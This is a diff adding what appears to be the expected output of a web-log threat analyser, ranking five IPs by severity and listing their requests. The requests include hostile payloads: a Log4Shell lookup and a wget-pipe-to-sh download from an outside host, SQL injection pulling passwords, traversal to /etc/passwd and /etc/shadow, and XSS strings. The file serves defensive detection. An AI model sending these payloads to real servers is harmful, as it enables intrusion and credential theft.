@@ -1,0 +1,20 @@
+172 requests, 51 suspicious, 5 offending IPs
+CRITICAL 192.0.2.77      score 20  4 requests, 4 errors  [rce]
+         GET /?x=${jndi:ldap://203.0.113.200/a}
+         GET /shell.php?cmd=id
+         GET /upload/x.php?cmd=wget%20http://203.0.113.200/m.sh%20|%20sh
+HIGH     203.0.113.9     score 25  5 requests, 5 errors  [scanner, sqli]
+         GET /products?id=1'%20OR%20'1'='1
+         GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--
+         GET /products?id=1;SELECT%20SLEEP(5)
+HIGH     198.51.100.99   score 20  37 requests, 37 errors  [recon, scanner, error-storm]
+         GET /.env
+         GET /.git/config
+         GET /phpmyadmin/
+MEDIUM   192.0.2.31      score 9   3 requests, 3 errors  [traversal]
+         GET /download?file=../../../../etc/passwd
+         GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
+         GET /static/..%2f..%2f..%2fetc/shadow
+MEDIUM   192.0.2.140     score 4   2 requests, 0 errors  [xss]
+         GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E
+         GET /search?q=%3Cimg%20src=x%20onerror=alert(1)%3E
